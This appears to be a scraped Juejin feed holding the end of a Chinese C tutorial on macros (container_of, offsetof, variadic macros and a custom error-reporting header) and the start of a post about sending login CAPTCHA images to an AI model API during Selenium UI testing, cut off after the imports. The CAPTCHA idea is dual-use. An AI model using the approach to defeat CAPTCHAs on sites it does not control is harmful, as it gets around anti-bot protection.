    <span class="hljs-type">int</span> n;  
    Scanf(n);  
    FOR(n){  
        Printf(i,<span class="hljs-string">' '</span>);  
    }  
    FORE(n){  
        Printf(i,<span class="hljs-string">'\n'</span>);  
    }  
}
</code></pre>
<h2 data-id="heading-10">宏定义提升</h2>
<h3 data-id="heading-11">宏使用技巧</h3>
<h4 data-id="heading-12">1. <strong>字符串化（Stringification）：<code>#</code> 操作符</strong></h4>
<p>将宏参数转为字符串字面量：在参数前面假设#会让它变成字面量也就是比如你传入age不在是age对应的值而是"age"一个字符串</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_INT(x) printf(#x <span class="hljs-string">" = %d\n"</span>, x)</span>

PRINT_INT(age); <span class="hljs-comment">// 展开为：printf("age" " = %d\n", age);</span>
                <span class="hljs-comment">// 输出：age = 25</span>
</code></pre>
<h4 data-id="heading-13">2. <strong>连接符（Token Pasting）：<code>##</code> 操作符</strong></h4>
<p>拼接 token：</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> REG_ADDR(base, offset) (base ## _BASE + offset)</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> GPIOA_BASE 0x40020000</span>

<span class="hljs-type">uint32_t</span> addr = REG_ADDR(GPIOA, <span class="hljs-number">0x00</span>); <span class="hljs-comment">// → GPIOA_BASE + 0x00</span>
</code></pre>
<h4 data-id="heading-14">3. <strong>可变参数宏（Variadic Macros，C99）</strong></h4>
<p>可以使用...代表可变参数(不确定类型个数你想怎么传怎么传),##__VA_ARGS__展开这个参数</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> LOG(fmt, ...) printf(<span class="hljs-string">"[LOG] "</span> fmt <span class="hljs-string">"\n"</span>, ##__VA_ARGS__)</span>

LOG(<span class="hljs-string">"Error: %s"</span>, strerror(errno));
</code></pre>
<blockquote>
<p>🔸 <code>##__VA_ARGS__</code> 是 GCC 扩展，用于处理空参数情况。</p>
</blockquote>
<h4 data-id="heading-15">typeof 自动推导类型根据我们传入参数推导这个类型</h4>
<p>可以更改我们上面的SWAP函数</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAP(a,b) do{\  </span>
typeof(a) temp = (a); \  
(a)= (b); \  
(b) = temp; \  
}<span class="hljs-keyword">while</span>(<span class="hljs-number">0</span>)
</code></pre>
<h3 data-id="heading-16">常用系统宏定义</h3>



































<table><thead><tr><th>宏</th><th>含义</th><th>典型用途</th></tr></thead><tbody><tr><td><code>__FILE__</code></td><td>当前源文件名</td><td>错误定位</td></tr><tr><td><code>__LINE__</code></td><td>当前行号</td><td>崩溃追踪</td></tr><tr><td><code>__func__</code></td><td>当前函数名</td><td>日志打印</td></tr><tr><td><code>__DATE__</code></td><td>编译日期</td><td>固件信息</td></tr><tr><td><code>__TIME__</code></td><td>编译时间</td><td>版本追踪</td></tr></tbody></table>
<h3 data-id="heading-17">container_of内核经典宏(重点）</h3>
<h4 data-id="heading-18">为什么需要反推结构体呢？</h4>
<h5 data-id="heading-19">特殊情况的数据查找</h5>
<p>我自己想的可以不用管
举一个例子：我们现在有一个商品链表，需要找一个商品的归属者。为什么会通过商品反推归属者，而非从每个用户里查找该商品是否属于他？ 因为从用户侧查找需要遍历每个用户的商品列表，即便做成普通链表，查找效率也一般；但如果是<strong>带分类的链表</strong>（类似数据库的索引设计），把商品链表先按类型分类、再按品牌细分，每个子链表的规模会大幅缩小。 简单来说，对内容做分类后，能快速定位到对应类型的子链表，在小范围内查找商品后，再反推其归属者，查找效率会大幅提升。</p>
<h4 data-id="heading-20">内核或者系统设计的封装、隔离、权限设计</h4>
<h5 data-id="heading-21">1. 为了接口的通用性</h5>
<p>比如实现一个定时器函数，面对多个不同设备（电机、LED、传感器），不可能为每个设备单独写一个定时器函数，只能<strong>统一接口并传入公共部分</strong>；而实际使用设备时，就需要从定时器结构体反推到对应的设备结构体。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-type">void</span> <span class="hljs-title function_">timer_expire</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> timer_node *node)</span>{<span class="hljs-comment">//传入设备的时间上的结构体</span>
  active(device);<span class="hljs-comment">//时间到了激活设备</span>
}
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Motor</span> {</span>
    <span class="hljs-type">int</span> speed;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_node</span> <span class="hljs-title">t</span>;</span>
};

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LED</span> {</span>
    <span class="hljs-type">int</span> brightness;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_node</span> <span class="hljs-title">t</span>;</span>
};

<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Sensor</span> {</span>
    <span class="hljs-type">int</span> value;
    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_node</span> <span class="hljs-title">t</span>;</span>
};

</code></pre>
<h5 data-id="heading-22">2. 权限保护（核心是隔离）</h5>
<p>还是上面的定时器例子，定时器模块本就不应该访问设备的所有信息，这样做会存在严重的安全隐患，通过只传入公共的定时器结构体，能严格隔离模块的访问权限。</p>
<h3 data-id="heading-23">✅ 面试经典题：手写container_of实现？</h3>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> my_offsetof(type, member) ((size_t)&amp;((type*)0)-&gt;member) </span>
</code></pre>
<h4 data-id="heading-24">分步骤理解核心逻辑</h4>
<ol>
<li><code>(type*)0</code>：假设将一个<code>type</code>类型的结构体，强行放置在内存地址<strong>0</strong>的位置；</li>
<li><code>((type*)0)-&gt;member</code>：访问这个虚拟结构体中的<code>member</code>成员；</li>
<li><code>&amp;((type*)0)-&gt;member</code>：取该成员的内存地址——因为结构体从0地址开始，成员的地址值就是它相对于结构体首地址的<strong>偏移量</strong>。
<strong>通俗举例</strong>： 知道我的位置<code>x</code>、你的位置<code>y</code>未知，想求彼此的距离（偏移量）。保持距离不变（结构体成员偏移量固定），让你站到0的位置，此时我的位置<code>x</code>就是我们之间的距离，这就是<code>offsetof</code>的核心思想。</li>
</ol>
<h3 data-id="heading-25">Linux 内核经典宏：<code>container_of</code></h3>
<p><code>container_of</code>是<code>offsetof</code>的反向应用：<strong>已知成员的地址 + 成员的偏移量，反推结构体的首地址</strong>（这个地方就是上面的例子我知道我们之间的距离之后直接用我的位置减去距离即可）。</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> container_of(ptr, type, member) ({          \
   const typeof(((type *)0)-&gt;member) * __mptr = (ptr); \
   (type *)((char *)__mptr - offsetof(type, member)); \
})</span>
<span class="hljs-comment">// 使用</span>
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> *<span class="hljs-title">node</span> =</span> ...;
<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Task</span> *<span class="hljs-title">task</span> =</span> container_of(node, <span class="hljs-keyword">struct</span> Task, list_node);
</code></pre>
<p>###宏定义实战
编写一个自定义的报错头文件，可以在别的文件中引用，当我引用这个头文件的时候，就可以通过错误编号使用例如<code>ERROR(ERR_EMPTY);</code>，显示错误原因，错误所在文件，行，列和用户附带信息，并终止程序比如下面这个样子，并且<strong>可以点击帮助用户快速跳转到错误并知晓错误原因</strong></p>
<pre><code class="hljs language-c" lang="c">main.c:<span class="hljs-number">13</span>: [ERROR] main | reason: The current container is empty 
test: Error.h:<span class="hljs-number">49</span>: my_error_handler: Assertion `<span class="hljs-number">0'</span> failed.
Aborted (core dumped)
</code></pre>
<h5 data-id="heading-26">实现代码 知识点在下面</h5>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> ERROR_H</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR_H</span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;errno.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;assert.h&gt;</span></span>

<span class="hljs-comment">// 错误码枚举</span>
<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">ERRCode</span> <span class="hljs-title">ERRCode</span>;</span>
<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">ERRCode</span>{</span>
    ERR_PTR_NULL,   <span class="hljs-comment">// 空指针</span>
    ERR_OPT_FAIL,   <span class="hljs-comment">// 操作失败</span>
    ERR_MEM_FAIL,   <span class="hljs-comment">// 内存申请失败</span>
    ERR_EMPTY       <span class="hljs-comment">// 容器为空</span>
};

<span class="hljs-comment">// 错误码对应描述</span>
<span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-type">char</span>* ErrStr[]={
    <span class="hljs-string">"current point is NULL"</span>,
    <span class="hljs-string">"current opt is failed"</span>,
    <span class="hljs-string">"memory allocation is failed"</span>, 
    <span class="hljs-string">"The current container is empty"</span>
};

<span class="hljs-comment">// 错误处理核心函数</span>
<span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title function_">my_error_handler</span><span class="hljs-params">(
   ERRCode code,<span class="hljs-comment">//错误代码</span>
   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *file,<span class="hljs-comment">//文件名</span>
   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *func,<span class="hljs-comment">//函数名</span>
   <span class="hljs-type">const</span> <span class="hljs-type">int</span> line,<span class="hljs-comment">//所在行</span>
   <span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg<span class="hljs-comment">//用户携带信息</span>
)</span>{
   
    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"%s:%d: [ERROR] %s | reason: %s "</span>, file, line, func, ErrStr[code]);
    
    <span class="hljs-comment">// 自定义消息</span>
    <span class="hljs-keyword">if</span>(msg){
        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"| msg: %s "</span>, msg);
    }
    <span class="hljs-comment">// 系统错误（errno）</span>
    <span class="hljs-keyword">if</span>(errno){
     <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"| system prompt: %s "</span>, strerror(errno));
    }
   <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">"\n"</span>);
   <span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> NDEBUG</span>
   <span class="hljs-built_in">exit</span>(EXIT_FAILURE);
   <span class="hljs-meta">#<span class="hljs-keyword">else</span></span>
   assert(<span class="hljs-number">0</span>);
   <span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
}
<span class="hljs-comment">//接下来两种错误模型</span>
<span class="hljs-comment">// 传入参数错误代码：兼容单/双参数，此时传入用户携带信息为空</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> _ERROR_MODE1(code) do{\
    my_error_handler((code),__FILE__,__func__,__LINE__,NULL);\
}while(0)</span>
<span class="hljs-comment">//传入参数错误代码和用户携带信息</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> _ERROR_MODE2(code,msg) do{\
    my_error_handler((code),__FILE__,__func__,__LINE__,msg);\
}while(0)</span>
<span class="hljs-comment">//_1,_2占位符就是你不使用前两个变量，第三个变量就是我的模型</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> _GET_MODE(_1,_2,NAME) NAME </span>
<span class="hljs-comment">//...可变参数可能一个可能两个，然后如果是两个参数那么我的_ERROR_MODE2就是第三个参数我的模型</span>
<span class="hljs-comment">//如果是一个参数在加上一个_ERROR_MODE2，我的_ERROR_MODE1就可以变成我的模型</span>
<span class="hljs-comment">//__GET确定模型然后传入参数参数使用__VA_ARGS__展开参数</span>
<span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR(...) do{\ </span>
    _GET_MODE(__VA_ARGS__,_ERROR_MODE2,_ERROR_MODE1) (__VA_ARGS__);\
}<span class="hljs-keyword">while</span>(<span class="hljs-number">0</span>)
<span class="hljs-meta">#<span class="hljs-keyword">endif</span></span>
</code></pre>
<p>使用的知识点</p>
<h4 data-id="heading-27">1.枚举类</h4>
<p>将我们的一些字符替换成数字，具体来说比如ERR_PTR_NULL默认为0，往下继续枚举每次加1，ERR_OPT_FAIL是等于1的，直接运行下面代码看效果</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span>  </span>
<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">ERRCode</span>{</span>  
    ERR_PTR_NULL,   <span class="hljs-comment">// 空指针  </span>
    ERR_OPT_FAIL,   <span class="hljs-comment">// 操作失败  </span>
    ERR_MEM_FAIL,   <span class="hljs-comment">// 内存申请失败  </span>
    ERR_EMPTY       <span class="hljs-comment">// 容器为空  </span>
};  
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>{  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ERR_PTR_NULL= %d\n"</span>,ERR_PTR_NULL);  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ERR_OPT_FAIL= %d\n"</span>,ERR_OPT_FAIL);  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ERR_MEM_FAIL= %d\n"</span>,ERR_MEM_FAIL);  
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"ERR_EMPTY= %d\n"</span>,ERR_EMPTY );  
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;  
}
</code></pre>
<p>你如果想从3开始枚举直接写成</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">ERRCode</span>{</span>  
    ERR_PTR_NULL=<span class="hljs-number">3</span>,   <span class="hljs-comment">// 空指针  </span>
    ERR_OPT_FAIL,   <span class="hljs-comment">// 操作失败  </span>
    ERR_MEM_FAIL,   <span class="hljs-comment">// 内存申请失败  </span>
    ERR_EMPTY       <span class="hljs-comment">// 容器为空  </span>
};  
</code></pre>
<p>ERR_PTR_NULL本质是数字那我们就可以把它作为下标，结合错误字符串数组<code>char* ErrStr[]</code>我们就可以直接使用ErrStr[ERR_PTR_NULL],访问这个对应的错误的文本提示</p>
<h4 data-id="heading-28">inline函数</h4>
<p>也是函数只不过执行的时候是文本嵌套的格式执行大概，自行了解写不动了</p>
<h4 data-id="heading-29">自带的宏定义</h4>
<p>| <code>__FILE__</code> | 当前源文件名 | 错误定位 |
| <code>__LINE__</code> | 当前行号 | 崩溃追踪 |
| <code>__func__</code> | 当前函数名 | 日志打印 |
...可变参数，__VA_ARGS__展开这个参数，都在上面部分有介绍</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[调用ai接口-验证码的获取与识别]]></title>    <link>https://juejin.cn/post/7603054272158761010</link>    <guid>https://juejin.cn/post/7603054272158761010</guid>    <pubDate>2026-02-05T09:40:49.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603054272158761010" data-draft-id="7602464510607999002" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="调用ai接口-验证码的获取与识别"/> <meta itemprop="keywords" content="Python"/> <meta itemprop="datePublished" content="2026-02-05T09:40:49.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="峰中有多云"/> <meta itemprop="url" content="https://juejin.cn/user/1913602002914967"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            调用ai接口-验证码的获取与识别
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1913602002914967/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    峰中有多云
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T09:40:49.000Z" title="Thu Feb 05 2026 09:40:49 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;color:rgba(46,36,36,.87);overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{margin-bottom:5px;font-size:30px;font-weight:500}.markdown-body h1:before{content:"#";margin-right:10px;color:#1976d2}.markdown-body h2{font-size:28px;font-weight:400;border-left:5px solid #454545;margin-top:20px;padding-left:10px;transition:all .3s ease-in-out}.markdown-body h2:hover{border-color:#1976d2}.markdown-body h3{font-size:24px;font-weight:400;margin-top:15px;padding-bottom:0}.markdown-body h4{font-size:20px;font-weight:500}.markdown-body h5{font-size:16px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body h2:first-letter,.markdown-body h3:first-letter,.markdown-body p:first-letter{text-transform:capitalize}.markdown-body em{text-emphasis:dot;text-emphasis-position:under}.markdown-body img{display:block;margin:0 auto!important;max-width:100%;border-radius:2px;box-shadow:0 2px 4px -1px rgba(0,0,0,.2),0 4px 5px 0 rgba(0,0,0,.14),0 1px 10px 0 rgba(0,0,0,.12)!important}.markdown-body hr{position:relative;width:98%;height:1px;border:none;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,#ddd,#999,#ddd);overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background:#fff;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center}.markdown-body code{font-weight:900;word-break:break-word;border-radius:2px;overflow-x:auto;font-size:.87em;padding:.065em .4em;background-color:#fbe5e1;color:#c0341d}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border-radius:0 4px}.markdown-body pre&gt;code{font-weight:400;font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{margin:0 4px;text-decoration:none;color:#027fff;transition:all .3s ease-in-out;padding-bottom:4px;border-bottom:2px solid transparent}.markdown-body a:after{content:"";display:inline-block;width:18px;height:18px;margin-left:4px;vertical-align:middle;background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMiIgaGVpZ2h0PSIyMiI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiBzdHJva2U9IiMwMjdGRkYiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCI+PHBhdGggZD0iTTkuODE1IDYuNDQ4bDEuOTM2LTEuOTM2YzEuMzM3LTEuMzM2IDMuNTgtMS4yNTkgNS4wMTMuMTczIDEuNDMyIDEuNDMyIDEuNTEgMy42NzYuMTczIDUuMDEzbC0xLjQ1MiAxLjQ1Mi0uOTY4Ljk2OGMtMS4zMzcgMS4zMzYtMy41ODEgMS4yNTktNS4wMTMtLjE3MyIvPjxwYXRoIGQ9Ik0xMS4yNjcgMTUuMzY3bC0xLjkzNiAxLjkzNmMtMS4zMzYgMS4zMzctMy41OCAxLjI2LTUuMDEyLS4xNzMtMS40MzItMS40MzItMS41MS0zLjY3Ni0uMTczLTUuMDEybDEuNDUyLTEuNDUyLjk2OC0uOTY4YzEuMzM2LTEuMzM3IDMuNTgtMS4yNiA1LjAxMi4xNzMiLz48L2c+PC9zdmc+);background-size:cover;background-repeat:no-repeat}.markdown-body a:hover{border-color:#027fff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body a.footnote-backref:after,.markdown-body a.footnote-ref:after,.markdown-body sup a:after{display:none!important}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border:2px solid #c6c6c6}.markdown-body table img{box-shadow:none!important}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body del{color:rgba(0,0,0,.6)}.markdown-body blockquote{position:relative;color:#666;padding:5px 23px 1px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:hsla(0,0%,78.4%,.12);transition:all .2s ease-in-out}.markdown-body blockquote:hover{border-color:#1976d2}.markdown-body blockquote:after,.markdown-body blockquote:before{position:absolute;font-size:24px;font-weight:800;line-height:24px;color:#cbcbcb;opacity:.6}.markdown-body blockquote:before{content:"“";top:4px;left:6px}.markdown-body blockquote:after{content:"”";right:8px;bottom:-8px}.markdown-body blockquote&gt;p,.markdown-body blockquote blockquote{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body details{outline:none;border:none;border-left:4px solid #1976d2;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary:hover::-webkit-details-marker{color:#1976d2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="agate">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#333;color:#fff}.hljs-name,.hljs-strong{font-weight:700}.hljs-code,.hljs-emphasis{font-style:italic}.hljs-tag{color:#62c8f3}.hljs-selector-class,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#ade5fc}.hljs-bullet,.hljs-string{color:#a2fca2}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-quote,.hljs-section,.hljs-title,.hljs-type{color:#ffa}.hljs-bullet,.hljs-number,.hljs-symbol{color:#d36363}.hljs-keyword,.hljs-literal,.hljs-selector-tag{color:#fcc28c}.hljs-code,.hljs-comment,.hljs-deletion{color:#888}.hljs-link,.hljs-regexp{color:#c6b4f0}.hljs-meta{color:#fc9b9b}.hljs-deletion{background-color:#fc9b9b;color:#333}.hljs-addition{background-color:#a2fca2;color:#333}.hljs a{color:inherit}.hljs a:focus,.hljs a:hover{color:inherit;text-decoration:underline}</style><h2 data-id="heading-0">前言</h2>
<p>在做UI自动化测试的时候，经常会遇到登录时，需要输入验证码的场景<br/>
最简单的方式当然是和开发沟通，取消验证码的校验，<br/>
但是求人不如求自己，哈哈哈，就有了这篇文章</p>
<h2 data-id="heading-1">思路整理</h2>
<p>既然要进行验证码的读取，简单发散一下思路，</p>
<ol>
<li>获取验证码的图片数据</li>
<li>使用ocr第三方库处理图片</li>
<li>ocr识别图片</li>
<li>将识别后的数据进行保存
简单就分为以上四步</li>
</ol>
<p>但是开始进行代码的编写后，发现使用ocr第三方库遇到两个问题</p>
<ol>
<li>识别精度不高</li>
<li>python版本不兼容，配置很麻烦</li>
</ol>
<p>于是开始转变思路，最近ai比较火，想尝试通过访问ai接口，上传图片数据，让ai进行识别返回数据</p>
<ol>
<li>获取验证码的图片数据</li>
<li>创建连接访问ai端口</li>
<li>构建对话内容</li>
<li>输出验证码内容</li>
</ol>
<h2 data-id="heading-2">代码实现</h2>
<p>代码使用的是【方舟大模型】
首先需要安装方舟 SDK
pip install volcenginesdkarkruntime</p>
<p>关于selenium部分就不在这里编写了</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> datetime
<span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver
<span class="hljs-keyword">from</span> selenium.webdriver.support <span class="hljs-keyword">import</span> expected_conditions <span class="hljs-keyword">as</span> EC
<span class="hljs-keyword">from</span> selenium.webdriver.common.by <span class="hljs-keyword">import</span> By
